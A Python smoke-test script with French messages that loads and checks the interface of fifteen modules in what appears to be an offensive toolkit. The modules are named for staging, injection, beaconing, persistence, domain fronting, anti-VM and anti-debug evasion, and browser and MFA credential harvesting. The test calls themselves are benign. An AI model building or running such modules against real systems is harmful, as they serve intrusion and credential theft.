import importlib.util, os, sys

MOD_DIR = os.path.join("packs", "05-arsenal", "modules")
TESTS = [
    ("stager", "stage_b64", {"payload": "payload-de-test", "key": ""}),
    ("inject_kit", "list", {}),
    ("beacon_kit", "status", {}),
    ("exec_kit", "cmd", {"command": "echo lucy-smoke-ok"}),
    ("persist_kit", "list", {}),
    ("covert_store", "file_put", {"path": "", "data": ""}),
    ("traffic_shaper", "template", {"name": "http"}),
    ("secret_hunter", "patterns", {}),
    ("domain_fronting", "sni_check", {"host": "127.0.0.1", "port": 1}),
    ("anti_vm", "summary", {}),
    ("anti_debug", "summary", {}),
    ("syscall_kit", "status", {}),
    ("mfa_harvest", "list", {}),
    ("browser_harvest", "key", {"profile": "aucun-profil"}),
    ("brute_local", "algorithms", {}),
]

fails = 0
for name, action, params in TESTS:
    path = os.path.join(MOD_DIR, name + ".py")
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(mod)
        for attr in ("NAME", "VERSION", "DESCRIPTION", "AUTHOR", "DEPENDENCIES", "OS_COMPAT"):
            if not hasattr(mod, attr):
                raise AssertionError("constante manquante: " + attr)
        if not callable(getattr(mod, "run", None)):
            raise AssertionError("run() manquante")
        r = mod.run(action, params)
        if not isinstance(r, dict) or "status" not in r or "data" not in r or "error" not in r:
            raise AssertionError("resultat non conforme: " + repr(r)[:100])
        status = r["status"]
        if status not in ("completed", "failed"):
            raise AssertionError("statut inattendu: " + repr(status))
        msg = r["error"] if status == "failed" else str(r["data"])[:60]
        print(f"OK  {name:16s} {action:12s} -> {status:9s} {msg}")
    except Exception as exc:
        fails += 1
        print(f"FAIL {name:16s} {action:12s} -> {type(exc).__name__}: {exc}")

print("RESULT:", "ALL PASS" if fails == 0 else f"{fails} FAILURES")
sys.exit(1 if fails else 0)
